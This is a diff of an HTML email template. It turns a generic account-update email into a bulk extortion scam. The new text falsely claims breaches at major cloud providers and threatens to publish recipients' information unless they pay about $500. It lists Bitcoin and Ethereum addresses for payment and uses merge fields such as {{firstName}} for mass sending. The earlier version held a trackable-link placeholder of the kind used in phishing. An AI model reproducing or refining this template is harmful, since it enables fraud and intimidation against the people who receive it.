@@ -3,77 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Important Update</title>
+    <title>Read Below</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            line-height: 1.6;
-            color: #333333;
             background-color: #f4f4f4;
             margin: 0;
             padding: 0;
         }
-        .email-container {
+        .container {
+            width: 100%;
             max-width: 600px;
-            margin: 20px auto;
+            margin: 0 auto;
             background-color: #ffffff;
-            padding: 30px;
+            padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
         .header {
+            background-color: rgba(0, 0, 255, 0.459);
+            color: #ffffff;
+            padding: 10px 0;
             text-align: center;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #eeeeee;
-        }
-        .header h1 {
-            color: #0056b3;
-            margin: 0;
+            border-radius: 8px 8px 0 0;
         }
         .content {
-            padding: 20px 0;
+            padding: 20px;
+            text-align: left;
         }
-        .button-container {
-            text-align: center;
+        .footer {
             margin-top: 20px;
+            font-size: 12px;
+            color: #888888;
+            text-align: center;
         }
         .button {
             display: inline-block;
-            background-color: #007bff;
+            background-color: rgba(0, 0, 255, 0.459);
             color: #ffffff;
             padding: 10px 20px;
             text-decoration: none;
             border-radius: 5px;
-            font-weight: bold;
-        }
-        .footer {
-            text-align: center;
-            padding-top: 20px;
-            border-top: 1px solid #eeeeee;
-            font-size: 0.9em;
-            color: #777777;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="email-container">
+    <div class="container">
         <div class="header">
-            <h1>Important Update Regarding Your Account</h1>
+            <!-- <h1>📢 Airdrop Announcement!</h1> -->
         </div>
         <div class="content">
-            <p>Dear User,</p>
-            <p>We have an important update for you. Please click the button below to view the details.</p>
-            <p>This link is unique to you and will ensure you receive personalized information.</p>
-            <div class="button-container">
-                <a href="[TRACKABLE_LINK_PLACEHOLDER]" class="button">View Your Update</a>
-            </div>
-            <p>If the button above doesn't work, you can copy and paste the following link into your browser:</p>
-            <p><a href="[TRACKABLE_LINK_PLACEHOLDER]">[TRACKABLE_LINK_PLACEHOLDER]</a></p>
-            <p>Thank you for your attention.</p>
+            <p>Hello {{firstName}},</p>
+            <p>You are receiving this encrypted private mail because of the recent databreaches in various servers(AWS,Microsoft Azure,Google Cloud Platform,IBM Cloud,Oracle Cloud).<br>
+            A new secured classified platform is in touch to help protect your information<br></p>
+            <p>A certain amount is insured to pay by affected accounts,<br>
+            as not to release your information to the public.</p>
+            <p>This is not a drill.</p>
+            <p>💰 Payment Instructions:</p>
+            <p>Summation of 0.00435 BTC ≈ $500, should be paid to the below address to protect your information<br>
+            <span style="background-color: #f0f0f0; padding: 5px 10px; border-radius: 3px; display: inline-block; margin-top: 5px;">bc1qxdtwxgrwfqn8a6zvz6xamamur744hufswn604k</span><br> (Copy bitcoin address)</p>
+            <span style="background-color: #f0f0f0; padding: 5px 10px; border-radius: 3px; display: inline-block; margin-top: 5px;">0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54</span><br> (Copy ethereum address)</p>
+            <p>Do well to reply this mail with proof of payment.</p>
+            <p>Thank you for your compliance</p>
+            <p>Best Regards<br>
+            Email Services</p>
+           <p><small>Sent to: {{firstName}}</small></p>
+          <p><small>Sent on: {{timestamp}}</small></p>
         </div>
-        <div class="footer">
-            <p>&copy; 2023 Your Company. All rights reserved.</p>
-            <p>You received this email because you are a registered user.</p>
+        </div>
         </div>
     </div>
 </body>
